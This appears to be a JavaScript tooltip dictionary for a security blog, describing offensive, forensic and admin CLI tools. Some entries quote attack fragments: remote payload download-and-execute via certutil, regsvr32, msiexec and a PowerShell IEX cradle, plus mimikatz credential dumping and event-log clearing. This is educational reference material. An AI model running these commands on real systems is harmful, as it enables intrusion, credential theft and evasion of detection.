(function () {
  'use strict';

  /* ── Command tooltip dictionary ─────────────────────────────────────────── */
  /* Covers every CLI tool/binary referenced across posts, not just a handful —
     grouped by category for maintainability. Each entry is 1-3 sentences:
     what it does, how/why it works, and a caveat or flag worth knowing. */
  var CMD_TIPS = {

    /* ── Network & recon ── */
    nmap:         "Network scanner that discovers live hosts, open ports, and the services running on them. -sV grabs version banners, -sC runs default NSE scripts, and -p- sweeps the full 65535-port range — usually the first command run against a new target.",
    masscan:      'An asynchronous TCP port scanner built for speed over depth — sweeps the entire IPv4 space in minutes using raw SYN packets without tracking full connection state. Typically used to find open ports fast, then handed to nmap for accurate service/version detection on just those ports.',
    gobuster:     'A fast, Go-based brute-forcer for web directories/files (dir mode) and DNS subdomains (dns mode) — feeds a wordlist against a target and reports hits by HTTP status code or successful DNS resolution.',
    ffuf:         'A fast web fuzzer that substitutes a FUZZ placeholder anywhere in a request — URL path, header, or POST body — with each line of a wordlist. Filtering by response size or status code (-fs/-fc) is what turns a flood of results into something useful.',
    wfuzz:        'A Python web application fuzzer, conceptually similar to ffuf but slower — substitutes a FUZZ keyword into any part of an HTTP request and filters results by response code, size, or regex match.',
    dirb:         'A recursive web content brute-forcer that walks a wordlist against a target looking for valid directories and files by response code — the slower predecessor to faster modern tools like gobuster and ffuf.',
    nikto:        'An automated web server scanner that checks for thousands of known-dangerous files, outdated server versions, and common misconfigurations in one pass. Noisy and easily logged — better suited to authorized assessments than stealthy recon.',
    wpscan:       "A WordPress-specific vulnerability scanner that fingerprints the core version, plugins, and themes, then cross-references them against a vulnerability database. Can also brute-force wp-login.php when given a credential list.",
    hydra:        'An online, network-protocol password brute-forcer — tests credential lists against live services (SSH, HTTP forms, FTP, RDP, and dozens more) directly over the network, as opposed to cracking an already-captured offline hash.',
    whois:        'Queries domain or IP registration records — registrant details, registrar, creation/expiry dates, and name servers. One of the few OSINT lookups that needs no special tooling, just a TLD-aware client.',
    dig:          'A DNS lookup utility for querying any record type (A, MX, TXT, NS) against a specific resolver. dig axfr @ns target.com attempts a (usually rejected) full zone transfer — when it succeeds, it dumps the entire zone at once.',
    nslookup:     'An older, interactive-capable DNS query tool. Functionally overlaps with dig but with a less scriptable output format — dig is generally preferred in modern tooling chains.',
    traceroute:   'Maps the network path to a destination by sending packets with incrementing TTL values and recording which router replies at each hop. Useful for spotting load balancers or extra NAT layers before an engagement.',
    ping:         "Sends ICMP echo requests to check basic host reachability and round-trip latency. Often blocked by firewalls, so a non-response does not necessarily mean a host is down.",
    'arp-scan':   'Sends ARP requests across a local subnet to enumerate live hosts that respond — works even against hosts that block ICMP, since ARP operates below the IP layer entirely.',
    ipcalc:       'Computes subnet boundaries, broadcast address, host count, and usable IP range from a given CIDR — a quick sanity check before scoping a scan to the right range.',
    amass:        'An OWASP project for in-depth attack-surface mapping — combines passive sources (certificate transparency logs, DNS datasets) with active brute-forcing to enumerate subdomains far beyond a single wordlist run.',
    subfinder:    'A passive subdomain enumeration tool that queries dozens of external sources (certificate transparency, search engines, DNS aggregators) without ever touching the target directly — quieter than amass’s active mode.',
    dnsx:         'A fast DNS toolkit for resolving large subdomain lists in bulk and filtering by record type — commonly chained after subfinder/amass to confirm which discovered subdomains actually resolve.',
    dnsrecon:     'A DNS enumeration tool combining zone transfer attempts, brute-forcing, and reverse lookups into one utility — an older but still-common all-in-one alternative to running dig/amass separately.',
    theharvester: 'Gathers emails, subdomains, hostnames, and employee names from public sources (search engines, PGP key servers, certificate transparency) — a standard first pass for OSINT before a social-engineering or external assessment.',
    shodan:       'A search engine that continuously scans the internet and indexes the banners it finds — lets you search for exposed services (a software version, an open RDP port, an unauthenticated database) without scanning anything yourself.',
    sherlock:     'Checks for the existence of a given username across hundreds of social platforms simultaneously — useful for building a profile of a target’s online footprint during OSINT.',
    trufflehog:   'Scans git repository history (not just the current commit) for accidentally committed secrets — API keys, credentials, tokens — by pattern-matching and entropy analysis across every past commit, including ones since deleted from HEAD.',
    swaks:        'A Swiss-army-knife SMTP testing tool — scripts a full SMTP conversation (HELO, MAIL FROM, RCPT TO, DATA) for testing open relays, VRFY enumeration, or spoofed-sender delivery.',
    'smtp-user-enum': 'Enumerates valid usernames on a mail server by abusing the SMTP VRFY/EXPN/RCPT TO commands, which on misconfigured servers respond differently for valid vs. invalid recipients.',
    onesixtyone:  "A fast SNMP scanner that brute-forces community strings (default: 'public') against a list of targets — the first step in SNMP enumeration, since most SNMP attacks need a valid community string first.",
    snmpwalk:     "Walks an entire SNMP MIB tree from a target, dumping every OID it can read — with the default 'public' community string this routinely leaks running processes, software, and network interfaces on misconfigured devices.",
    snmpget:      'Reads a single specific SNMP OID value from a target, given a known community string — the targeted counterpart to snmpwalk’s full-tree dump.',
    snmpbulkwalk: 'Like snmpwalk, but requests multiple OIDs per packet — significantly faster for walking a large MIB tree against a slow or rate-limited device.',
    snmpset:      'Writes a new value to a writable SNMP OID — on a misconfigured device with a guessable write community string, this can reconfigure the device, not just read from it.',
    'snmp-check': 'A more human-readable SNMP enumeration tool than raw snmpwalk — formats system info, interfaces, and processes into structured output instead of a flat OID dump.',

    /* ── Web ── */
    curl:         'A command-line tool for transferring data over HTTP/S, FTP, and other protocols. In an offensive context it is the universal way to manually replay and inspect HTTP requests — -X for method, -H for headers, -d for body, -v for the full request/response.',
    wget:         'Downloads files over HTTP/S/FTP, with built-in recursive mirroring (-r) of an entire site. Where curl is built for scripting and inspecting requests, wget is built for reliably downloading content.',
    sqlmap:       'Automates detection and exploitation of SQL injection across nearly every major database engine. Beyond confirming a vulnerable parameter, it can enumerate databases, dump tables, read/write files, and in some configurations get an OS shell.',
    burpsuite:    'An intercepting HTTP/S proxy for inspecting and modifying requests in transit between browser and server — Repeater replays a tweaked request on demand, Intruder automates parameter fuzzing across a wordlist.',
    ysoserial:    'Generates Java deserialization gadget chain payloads for dozens of known-vulnerable libraries (Commons Collections, Spring, Groovy). Point it at the right gadget chain for whatever is on the target’s classpath and it builds a working RCE payload.',
    phpggc:       'The PHP equivalent of ysoserial — a library of pre-built gadget chains for PHP object injection vulnerabilities, targeting specific versions of common frameworks like Laravel and Symfony.',
    openssl:      'A general-purpose cryptography toolkit — used offensively to inspect a TLS certificate chain (s_client), generate self-signed certs for testing, or hash/encrypt data from the command line without writing code.',
    jq:           'A command-line JSON processor — filters, reshapes, and extracts fields from JSON API responses or log exports without writing a script, e.g. piping a KEV feed or cloud API response straight into a one-liner filter.',

    /* ── Active Directory / Windows offensive tooling ── */
    crackmapexec: 'A post-exploitation and lateral-movement tool for Windows/AD networks — sprays credentials across a subnet over SMB/WinRM/SSH/MSSQL/LDAP in one command, dumps SAM hashes, and executes commands. Superseded by its actively-maintained fork, NetExec (nxc).',
    nxc:          'NetExec, the actively-maintained fork of CrackMapExec — sprays credentials across a subnet over SMB/WinRM/SSH/MSSQL/LDAP, dumps SAM hashes, executes commands, and pulls AD enumeration data, all from one binary.',
    'evil-winrm': 'A WinRM client built specifically for offensive use — opens an interactive PowerShell-like shell over WinRM (port 5985/5986) given valid credentials or a hash, with built-in upload/download and in-memory module loading.',
    smbclient:    'An FTP-like interactive client for browsing and interacting with SMB shares from Linux — lists shares, gets/puts files, and works anonymously (-N) when a share allows null sessions.',
    rpcclient:    'Opens an MS-RPC session against a Windows host to query users, groups, and domain info directly over the RPC endpoint mapper — works even when SMB share access itself is locked down.',
    smbmap:       'Enumerates SMB share permissions across a target or subnet in one pass — shows exactly which shares a given credential can read, write, or has no access to, without connecting to each one individually.',
    enum4linux:   'Enumerates Windows/Samba systems over SMB and RPC — pulls users, groups, shares, password policy, and OS info in one run.',
    'enum4linux-ng': 'A rewrite of enum4linux that outputs structured JSON/YAML instead of flat text, making the same SMB/RPC enumeration easier to feed into other tooling.',
    ldapsearch:   'Queries an LDAP directory (including Active Directory) directly — with valid or even anonymous credentials, it can dump the directory schema, user objects, and group memberships depending on what the directory permits.',
    ldapdomaindump: 'Dumps an Active Directory domain’s users, groups, computers, and policies via LDAP into both machine-readable JSON and browsable HTML reports — faster than scripting ldapsearch queries by hand.',
    kerbrute:     'Enumerates valid AD usernames and brute-forces passwords by abusing Kerberos pre-authentication — a wrong username and a wrong password produce different Kerberos error codes, so this works without generating a Windows logon failure event.',
    responder:    'Listens on a local network segment and answers NetBIOS/LLMNR/mDNS broadcasts that should have failed, tricking Windows hosts into authenticating to it directly — captures NTLMv2 hashes for offline cracking or relay.',
    mimikatz:     'A post-exploitation tool for extracting plaintext passwords, hashes, and Kerberos tickets from Windows memory (notably LSASS). sekurlsa::logonpasswords dumps cached credentials; lsadump::dcsync impersonates a domain controller to replicate hashes for any account, including krbtgt.',
    'rubeus.exe': 'A C# toolkit for raw Kerberos ticket manipulation — requesting, forging, renewing, and passing tickets (TGTs/TGSs), including the S4U2Self/S4U2Proxy requests that drive constrained-delegation and RBCD abuse.',
    'sharphound.exe': 'The official BloodHound data collector for Windows — walks the domain via LDAP and SMB to gather users, groups, ACLs, sessions, and trust relationships, then packages it into a zip for ingestion into the BloodHound graph.',
    'bloodhound-python': 'A Python reimplementation of SharpHound’s collection logic, for running BloodHound data collection from a Linux operator box instead of a domain-joined Windows host.',
    bloodyad:     'A Python AD privilege-escalation toolkit built around making LDAP write operations easy — setting RBCD, adding a user to a group, or modifying an object’s owner/ACL with one command instead of scripting raw LDAP calls.',
    'petitpotam.py': 'Forces a Windows host (often a domain controller) to authenticate to an attacker-controlled listener by abusing the MS-EFSRPC API — used to coerce authentication for relaying or to capture a TGT from an unconstrained-delegation host.',
    'new-machineaccount': 'A PowerView cmdlet that creates a new computer account in the domain — by default, any authenticated domain user can create up to ten, which is what makes attacker-controlled RBCD setups possible without existing computer-object privileges.',
    'impacket-secretsdump': 'Dumps password hashes from a target — locally via SAM/SYSTEM registry hives, or remotely via DCSync against a domain controller given the right replication rights. The standard way to pull the krbtgt hash once DCSync rights are held.',
    'impacket-getuserspns': 'Requests Kerberos service tickets (TGS) for every SPN-bearing account in the domain and formats them for offline cracking — the standard Kerberoasting tool from the impacket suite.',
    'impacket-getnpusers': 'Requests AS-REP material for any account with Kerberos pre-authentication disabled, formatted for offline cracking — the standard AS-REP roasting tool from the impacket suite.',
    'impacket-psexec':    'Gets a SYSTEM shell on a remote Windows host by uploading a service binary over SMB and starting it as a service — the impacket reimplementation of Sysinternals’ PsExec.',
    'impacket-wmiexec':   'Executes commands on a remote Windows host via WMI instead of dropping a service binary — leaves a noticeably different (and often less logged) artifact trail than impacket-psexec.',
    'impacket-smbexec':   'Executes commands on a remote Windows host by creating and immediately deleting a temporary service per command — another impacket lateral-movement primitive with its own distinct artifact pattern.',
    'impacket-smbserver': 'Spins up a minimal, ad-hoc SMB server on the attacker box — used to host files for a target to pull over SMB, or to capture authentication attempts/hashes from anything that connects to it.',
    'impacket-ntlmrelayx': 'Relays a captured NTLM authentication attempt (often from Responder) straight to another target service in real time, instead of just cracking the hash offline — turning a captured auth attempt into immediate access elsewhere.',
    'impacket-mssqlclient': 'A command-line MSSQL client supporting Windows auth, SQL auth, and pass-the-hash — including xp_cmdshell-based command execution once connected with sufficient privilege.',
    'impacket-gettgt':    'Requests and saves a Kerberos TGT to a ccache file given a password, hash, or AES key — used to set up Kerberos auth for other impacket tools without re-authenticating each time.',
    'impacket-changepasswd': 'Changes or resets a domain account’s password over the Kerberos password-change protocol — usable with a ForceChangePassword ACL right without ever knowing the account’s current password.',

    /* ── LOLBins / Windows native binaries ── */
    'certutil.exe': 'A legitimate Windows certificate-management utility and a popular Living-off-the-Land download primitive — certutil -urlcache -f <url> <file> fetches a remote file using a binary that is signed, pre-installed, and rarely flagged by application allowlisting.',
    certutil:       'A legitimate Windows certificate-management utility and a popular Living-off-the-Land download primitive — certutil -urlcache -f <url> <file> fetches a remote file using a binary that is signed, pre-installed, and rarely flagged by application allowlisting.',
    'bitsadmin.exe': 'Manages the Windows Background Intelligent Transfer Service from the command line — abused to download payloads via a background, throttled transfer job that blends in with Windows Update traffic. Deprecated since Windows 10/Server 2008 but still present on legacy hosts.',
    'mshta.exe':    'Executes HTA (HTML Application) files, including ones referenced by a remote URL — a long-standing Living-off-the-Land technique for getting script execution from a signed Microsoft binary that most allowlisting policies do not block by default.',
    'regsvr32.exe': "Registers/unregisters COM DLLs — the 'Squiblydoo' technique abuses its ability to execute a remote scriptlet (regsvr32 /s /n /u /i:http://.../file.sct scrobj.dll) entirely in memory, with no file ever written to disk.",
    'wmic.exe':     'Windows Management Instrumentation command-line tool — can execute processes remotely (wmic /node:<target> process call create) using only credentials, no separate payload delivery step needed. Deprecated in newer Windows builds but still widely present.',
    wmic:           'Windows Management Instrumentation command-line tool — can execute processes remotely (wmic /node:<target> process call create) using only credentials, no separate payload delivery step needed. Deprecated in newer Windows builds but still widely present.',
    'rundll32.exe': 'Executes a function exported from a DLL — used legitimately by Windows constantly, which makes it an effective place to hide malicious DLL execution amid a sea of identical, benign invocations.',
    'msiexec':      'Installs Windows Installer (.msi) packages — also abusable as a Living-off-the-Land technique, since it can fetch and execute a remote .msi package directly (msiexec /i http://.../payload.msi /quiet).',
    cmdkey:         'Manages stored Windows credentials (the Credential Manager vault) from the command line — /list reveals saved targets, and cached entries here are a routine post-exploitation credential-harvesting check.',
    xfreerdp:       'An open-source RDP client for Linux — opens a graphical Remote Desktop session against a Windows target from a Linux operator box, including pass-the-hash authentication when given an NTLM hash instead of a plaintext password.',

    /* ── PowerShell & Windows administration ── */
    'get-aduser':      'A built-in Active Directory PowerShell module cmdlet for querying user objects — the standard administrative equivalent of what offensive PowerView cmdlets enumerate, useful when only the official RSAT module is available.',
    'get-adcomputer':  'A built-in AD PowerShell cmdlet for querying computer objects — domain-joined machine names, OS versions, and last-logon timestamps, straight from the directory.',
    'get-adgroup':     'A built-in AD PowerShell cmdlet for querying group objects and their properties — often paired with Get-ADGroupMember to resolve actual membership.',
    'get-adgroupmember': 'Resolves the actual member list of a given AD group, including nested group membership when used recursively — the basic building block for tracing who really has access through group nesting.',
    'get-addomain':    'Returns high-level information about the current (or a specified) AD domain — functional level, domain controllers, and the domain SID, useful as an orientation step on a new foothold.',
    'get-adforest':    'Returns information about the entire AD forest, including every domain in it and forest-wide trust relationships — relevant when an engagement might cross domain boundaries within the same forest.',
    'get-addomaincontroller': 'Lists domain controllers for the current or specified domain — the starting point before targeting a DC directly for DCSync, zone transfer attempts, or further enumeration.',
    'get-gpo':         'Queries Group Policy Objects in the domain — GPOs are a common privilege-escalation and lateral-movement vector when their permissions allow a non-admin to edit one that applies to privileged machines.',
    'get-winevent':    'Queries the Windows Event Log with structured XPath filtering by event ID, time range, and provider — the standard way to pull specific security/Sysmon events for incident investigation from the command line.',
    'invoke-webrequest': "PowerShell's built-in cmdlet for making HTTP requests, roughly analogous to curl — frequently used as a fileless download primitive since it is always present on modern Windows with no separate binary needed.",
    iex:               'Short for Invoke-Expression — executes a string as PowerShell code. Combined with a download cradle (IEX (New-Object Net.WebClient).DownloadString(...)) this is the most common pattern for fileless payload execution, since the script body never touches disk.',
    'get-netuser':     'A PowerView offensive enumeration cmdlet for AD user objects — functionally similar to the built-in Get-ADUser, but designed for environments without the RSAT AD module installed.',
    'get-netcomputer': 'A PowerView offensive enumeration cmdlet for AD computer objects — the no-RSAT-required equivalent of Get-ADComputer.',
    'get-domaincomputer': 'A modern PowerView/PowerSploit cmdlet for AD computer object enumeration, commonly chained with -Properties to pull specific attributes like delegation settings or operating system version in one query.',
    'get-netgroupmember': 'A PowerView cmdlet resolving AD group membership without requiring the RSAT module — the offensive-toolkit equivalent of Get-ADGroupMember.',
    'get-domainspnticket': 'A PowerView cmdlet that requests Kerberos service tickets for SPN-bearing accounts and formats them for cracking — a PowerShell-native alternative to impacket-GetUserSPNs for Kerberoasting.',
    'get-domainobjectacl': 'A PowerView cmdlet that reads the raw ACL/DACL of an AD object — the manual way to confirm exactly which ACL abuse edges (GenericAll, WriteDacl, ForceChangePassword…) BloodHound is reporting.',
    'find-localadminaccess': 'A PowerView cmdlet that checks, across every reachable computer in the domain, whether the current user has local administrator rights — a fast way to surface lateral-movement targets reachable from a given foothold.',
    'find-interestingdomainacl': 'A PowerView cmdlet that scans the whole domain for ACL grants considered unusual or dangerous by default — essentially an automated first pass at the same ACL-abuse-chain hunting BloodHound’s edges represent.',
    'set-domainobjectowner': 'A PowerView cmdlet that changes an AD object’s owner — the first step in the WriteOwner-to-GenericAll ACL abuse chain, since an object’s owner can always grant itself further rights on that object.',
    'add-domainobjectacl':  'A PowerView cmdlet that adds an access control entry to an AD object’s DACL — used to grant a controlled principal escalating rights (WriteDacl, then GenericAll) once ownership or an existing write right is held.',
    'get-domainobject':     'A general-purpose PowerView cmdlet for reading raw AD object properties and attributes — often used together with Set-DomainObject to both inspect and then modify a target attribute like RBCD delegation settings.',
    'set-domainobject':     'A PowerView cmdlet for writing arbitrary AD object attributes directly — most notably used to set msDS-AllowedToActOnBehalfOfOtherIdentity when configuring Resource-Based Constrained Delegation abuse.',
    'get-mpcomputerstatus': 'Returns the current Windows Defender status — whether real-time protection, cloud-delivered protection, and signature updates are actually active, rather than just installed.',
    'get-mppreference':     'Returns the configured Windows Defender exclusion paths, processes, and extensions — a misconfigured exclusion covering a writable directory is a direct way to run unscanned payloads.',
    'add-mppreference':     'Adds a Windows Defender exclusion (path, process, or extension) — legitimately used by administrators for performance reasons, and just as usable by an attacker with sufficient privilege to blind Defender to a specific payload location.',
    'get-scheduledtask':    'Lists Windows Scheduled Tasks and their triggers/actions — both a normal administrative check and a place attackers commonly hide persistence, since a task can relaunch a payload on a timer or at logon.',
    icacls:        'Displays or modifies Windows file/folder ACLs from the command line — both a legitimate permissions-management tool and a way to spot, or quietly grant yourself, excessive access on a sensitive file or directory.',
    schtasks:      'Creates, queries, or deletes Windows Scheduled Tasks from the command line — a common persistence mechanism, since a scheduled task can relaunch a payload on a timer or at logon without installing a service.',
    auditpol:      'Displays or modifies the Windows audit policy — controls which security events (logon attempts, object access, privilege use) actually get logged. Checking it tells you what an environment is and is not capable of detecting.',
    netsh:         'A multi-purpose Windows network configuration tool — among its many uses, netsh interface portproxy sets up local port-forwarding rules for pivoting traffic through a compromised host.',
    sc:            "Queries, creates, or modifies Windows services from the command line — sc create can install a malicious binary as a service for persistence; sc query is the Windows equivalent of checking a service's status on Linux.",
    tasklist:      'Lists running processes on Windows, including the parent process ID and, with /svc, which service is hosting which process — the Windows equivalent of ps.',
    wevtutil:      'Queries or exports Windows Event Logs from the command line — lighter-weight than Get-WinEvent for simple export/clear operations, and notably what wevtutil cl (clear log) looks like when an attacker is covering tracks.',

    /* ── Password cracking ── */
    john:          'John the Ripper — a CPU-based offline password cracker known for built-in mangling rules (case changes, leet-speak substitutions, appended digits) applied automatically on top of a wordlist, often catching variations a raw dictionary alone would miss.',
    hashcat:       'A GPU-accelerated offline password cracker supporting thousands of hash types via mode flags (-m). Dramatically faster than CPU-based cracking for most algorithms because the workload parallelizes across thousands of GPU cores at once.',
    hashid:        'Identifies the likely hash algorithm(s) for a given hash string by its length and character format — the first step before choosing the right hashcat mode or john format flag.',
    cewl:          'Crawls a website and builds a custom wordlist from the words actually found on its pages — useful for a target-specific password list built from company jargon and product names rather than a generic dictionary.',
    cupp:          'Generates a custom wordlist from a target’s personal details (name, birthdate, pet, partner) — based on the observation that human-chosen passwords are frequently derived from facts about the person, not randomness.',
    'ssh2john':    "Extracts the crackable hash representing an SSH private key's passphrase into John the Ripper's input format — the key file itself isn't directly crackable, but this derived representation of its passphrase is.",
    'zip2john':    "Extracts the crackable hash from a password-protected ZIP archive into John the Ripper's input format, the same way ssh2john does for SSH keys.",

    /* ── Forensics ── */
    binwalk:       "Scans a binary blob for embedded file signatures and known firmware structures — commonly used to extract a filesystem image hidden inside a router firmware dump, or to find a second file appended after a JPEG/PNG's actual end-of-file marker.",
    steghide:      'Embeds or extracts data hidden inside JPEG/BMP/WAV/AU files using a passphrase — detecting its presence usually is not the hard part (file size/structure anomalies hint at it); recovering the passphrase is.',
    zsteg:         'Detects LSB (least-significant-bit) steganography specifically in PNG and BMP images — checks multiple bit-plane and channel combinations automatically rather than requiring you to guess which one was used.',
    stegseek:      'A fast steghide passphrase cracker — brute-forces the passphrase protecting steghide-embedded data using a wordlist, far faster than steghide’s own brute-force mode.',
    exiftool:      'Reads and writes metadata embedded in image, video, and document files — EXIF, IPTC, and XMP fields routinely contain GPS coordinates, device identifiers, and author fields not visible anywhere in the rendered file itself.',
    'vol.py':      "A memory forensics framework (Volatility) for analysing RAM captures — pslist walks the process list and cmdline recovers the full command line a process was launched with, all without needing the live machine the image came from.",
    'log2timeline.py': 'Part of the Plaso forensic timeline framework — parses dozens of artifact types (browser history, event logs, filesystem metadata) into a single unified timeline for analysis.',
    'psort.py':    'The companion tool to log2timeline — filters and sorts a generated Plaso timeline by date range or keyword once the raw parsing pass is complete.',
    fls:           'Part of The Sleuth Kit — lists files and directories, including deleted ones still present in unallocated space, directly from a raw disk image without needing to mount the filesystem.',
    tcpdump:       'Captures and filters live network traffic from the command line using Berkeley Packet Filter (BPF) syntax — the headless counterpart to Wireshark, suited to capturing on a remote server over SSH where a GUI is not available.',
    tshark:        'The command-line counterpart to Wireshark — applies the same protocol dissectors and display filters from a terminal, making bulk pcap analysis scriptable over an SSH session.',
    'sha256sum':   "Computes the SHA-256 hash of a file's contents — used to verify file integrity after a transfer, or to compute a hash for an offline lookup against threat-intel hash databases.",
    md5sum:        "Computes the MD5 hash of a file's contents — faster but cryptographically weaker than SHA-256; still common for quick integrity checks where collision resistance does not matter.",

    /* ── Binary exploitation ── */
    checksec:      'Checks a binary for the security mitigations compiled into it — stack canaries, NX/DEP, PIE, and RELRO — which determines which exploitation techniques are even viable before writing a line of exploit code.',
    gdb:           'The GNU Debugger — sets breakpoints, steps through execution, and inspects registers/memory of a running or crashed program. Extended heavily for exploit development by plugins like GEF and pwndbg, which add memory-layout visualization on top.',
    objdump:       'Disassembles compiled binaries and object files into assembly, and dumps section headers, symbol tables, and relocation info — a static, non-interactive alternative to stepping through the same code in a debugger.',
    ropper:        'Searches a binary and its loaded libraries for ROP (Return-Oriented Programming) gadgets — short instruction sequences ending in a return, chained together to build arbitrary execution out of code that already exists in the target.',
    ropgadget:     'Functionally similar to ropper — scans a binary for usable ROP gadgets and can auto-generate a working ROP chain for common objectives like calling system() with a controlled argument.',
    one_gadget:    'Searches a given libc binary for "one gadget" offsets — single addresses that, if a small set of register/stack constraints happen to be satisfied, pop a shell in one jump instead of a full multi-step ROP chain.',
    strace:        'Traces every system call a process makes in real time — shows exactly which files it opens, network connections it attempts, and processes it spawns, even without access to its source code.',
    ltrace:        "Traces library (shared object) calls a process makes, as opposed to strace's kernel-level system calls — useful for watching higher-level function calls like malloc or strcpy directly.",

    /* ── Cloud ── */
    aws:           'The official AWS command-line interface — used to enumerate IAM permissions, assume roles, and interact with any AWS service the current credentials allow, often the first tool run after obtaining any AWS credential at all.',
    az:            'The official Azure command-line interface — the Azure equivalent of the AWS CLI: enumerating role assignments, subscriptions, and resources reachable by the currently authenticated identity.',
    gcloud:        'The official Google Cloud CLI — used to enumerate IAM bindings, service accounts, and project resources, and notably to mint short-lived access tokens for service account impersonation chains.',
    pmapper:       'Analyses an AWS account’s full IAM policy set offline and graphs every privilege-escalation path it can find between principals — turns a sprawling JSON policy export into a queryable attack-path graph, similar in spirit to BloodHound for AD.',
    roadrecon:     'Gathers and stores Azure AD (Entra ID) directory data — users, groups, app registrations, role assignments — into a local database, with both a CLI and a browsable GUI for offline tenant analysis.',

    /* ── Linux fundamentals ── */
    sudo:          "Runs a single command with another user's privileges (almost always root), authenticating with the caller's own password rather than the target user's. sudo -l lists exactly which commands the current user may run this way — often the first privesc check on a new foothold.",
    su:            "Switches to another user's shell, prompting for that user's password — distinct from sudo, which runs one command as another user using the caller's own password.",
    chmod:         'Changes a file or directory’s permission bits (read/write/execute for owner/group/other) — chmod +s sets the SUID/SGID bit, which is exactly what makes SUID-binary privilege escalation possible.',
    chown:         'Changes a file or directory’s owner and/or group — relevant both for legitimate administration and for spotting files an unexpected user/group was given ownership of on a compromised host.',
    find:          'Searches a filesystem for files matching given criteria — -perm -4000 finds SUID binaries, -newer finds recently modified files, and -exec runs a command against every match.',
    grep:          'Searches text for lines matching a pattern or regular expression — -r recurses through a directory tree, and -P enables full PCRE syntax for more complex matching than grep’s default basic regex.',
    base64:        'Encodes binary data as printable ASCII text, or decodes it back — frequently used to smuggle a payload through a context that only accepts plain text (a URL parameter, a PowerShell -EncodedCommand) before decoding it on the other side.',
    xxd:           'Produces a hex (and ASCII) dump of a file’s raw bytes, or reverses one back into binary — the standard way to inspect a file’s actual magic bytes when its extension cannot be trusted.',
    strings:       'Extracts sequences of printable characters from a binary file — a fast first pass over an unfamiliar executable or memory dump that often surfaces hardcoded URLs, file paths, or error messages without a disassembler.',
    git:           'Distributed version control — beyond everyday commit/push/pull, git log -p and a full clone’s .git directory are common targets for recovering secrets or source code "removed" in a later commit but still present in history.',
    docker:        "The standard container runtime CLI — docker ps/docker exec are routine administration, while a container with the Docker socket mounted inside it (-v /var/run/docker.sock) is a well-known container-escape-to-host-root vector.",
    kubectl:       'The Kubernetes cluster management CLI — kubectl auth can-i --list is the fastest way to check exactly what the current service account/context is actually authorized to do inside the cluster.',
    vim:           'A modal terminal text editor — :set paste before pasting multi-line content avoids vim’s auto-indent mangling it, a common gotcha when pasting a payload or config block over SSH.',
    nano:          'A simple, non-modal terminal text editor — far less powerful than vim, but with no learning curve, which is why it shows up constantly in quick on-target file edits during an engagement.',
    cat:           "Prints a file's contents to stdout — also commonly chained with a heredoc (cat << EOF > file) to write multi-line content to a file without an interactive editor, over a limited shell.",
    ls:            "Lists directory contents — -la (all files including hidden, long format) is the default habit on any new foothold, since hidden config/credential files (anything starting with '.') won't show without -a.",
    whoami:        'Prints the current effective username — whoami /priv on Windows additionally lists the current token’s privileges, often a faster path to spotting a privilege-escalation opportunity than the username alone.',
    id:            'Prints the current user’s UID, GID, and full group membership list — group membership alone (being in the docker or lxd group, for instance) is frequently a complete privilege-escalation path on its own.',
    uname:         'Prints system and kernel information — -a for everything at once, or -r for just the kernel release version needed to look up a matching local kernel-exploit CVE.',
    ps:            'Lists running processes — aux (all processes with full command lines) is the standard flag combination for spotting an interesting process, a credential passed on a command line, or an unexpected parent-child relationship.',
    netstat:       'Displays active network connections and listening ports — largely superseded by ss on modern Linux, but still the standard tool on Windows and many legacy systems.',
    ss:            'Displays socket statistics — the modern Linux replacement for netstat, generally faster since it reads kernel data structures directly rather than parsing /proc.',
    lsof:          'Lists open files held by running processes — since Linux treats network sockets and devices as files too, lsof -i specifically shows which process owns which open network connection.',
    tar:           'Archives and optionally compresses a set of files into a single file — tar -xzvf is the single most-typed flag combination for extracting a downloaded .tar.gz.',
    unzip:         'Extracts the contents of a ZIP archive — -P supplies a password non-interactively, useful when scripting extraction of a password-protected archive found during an engagement.',
    awk:           "A pattern-scanning and text-processing language built into most Unix systems — most often used in one-liners to extract specific columns from structured output, e.g. awk '{print $1}' for the first whitespace-delimited field.",
    sed:           'A stream editor for find-and-replace and other line-based text transformations, run non-interactively — frequently chained after grep to reformat matched lines on the fly.',
    systemctl:     'Controls systemd services and units — start/stop/enable/disable a service, or check its current status and recent log output, on any modern Linux distribution using systemd.',
    journalctl:    'Queries the systemd journal — the centralized binary log store for service output and kernel messages on systemd-based systems, searchable by service unit, time range, or priority.',
    crontab:       'Lists or edits a user’s scheduled cron jobs — both a normal sysadmin tool and a common persistence mechanism worth checking (crontab -l for the current user, plus /etc/cron.d/ for system-wide jobs).',
    scp:           "Copies files over SSH using user@host:path syntax — effectively cp extended across a network connection, authenticated and encrypted the same way as an interactive SSH session.",
    sftp:          'An interactive, SSH-based file transfer session — like an FTP client, but tunneled through SSH so it inherits SSH’s authentication and encryption instead of FTP’s plaintext-by-default protocol.',
    rsync:         'Synchronizes files/directories locally or over SSH, transferring only the bytes that changed since the last sync — far more efficient than scp for repeated transfers of mostly-unchanged data.',
    apt:           'Debian/Ubuntu’s high-level package manager — installs, removes, and updates software along with its dependencies, fetching from configured repositories.',
    dpkg:          'The low-level Debian package manager — installs/removes individual .deb package files directly, without apt’s automatic dependency resolution.',
    rpm:           'The low-level package manager for RPM-based distributions (RHEL, Fedora, SUSE) — installs/queries individual .rpm files directly, analogous to dpkg on Debian-based systems.',
    yum:           'The high-level package manager for older RHEL/CentOS systems — resolves and installs dependencies automatically from configured repositories, the RPM-based equivalent of apt.',
    pip3:          'Installs Python packages from PyPI — frequently the first command in any tool’s setup instructions, and worth checking what is actually being installed given how many supply-chain compromises have targeted exactly this trust relationship.',
    gcc:           'The GNU C compiler — used in exploitation to compile small C proof-of-concept programs (often a local privesc exploit pulled from an advisory) directly on the target, or to cross-compile for a different architecture.',
    ssh:           'Opens an encrypted remote shell session, and doubles as a tunnelling tool — -L/-R/-D set up local, remote, and dynamic (SOCKS) port forwards respectively, making it one of the most common pivoting primitives available.',
    'ssh-keygen':  'Generates a new SSH keypair, or computes the fingerprint of an existing one — also used to convert key formats.',
    'ssh-copy-id': 'Installs a local public key into a remote host’s ~/.ssh/authorized_keys over an existing password-based SSH session — the standard way to set up passwordless key-based login afterward.',
    proxychains:   'Forces an arbitrary command’s network connections through a chain of proxies (commonly a SOCKS proxy from a pivot) defined in its config file — lets you run tools with no native proxy support as if they did.',
    chisel:        'A fast TCP/UDP tunnel over HTTP, written in Go — commonly used to pivot through a single compromised host into an otherwise unreachable internal network segment, since it only needs outbound HTTP/S to function.',
    socat:         'A multi-purpose relay tool for connecting two data streams (sockets, files, ttys) together — frequently used to set up an upgraded, fully interactive reverse shell with proper terminal control.',
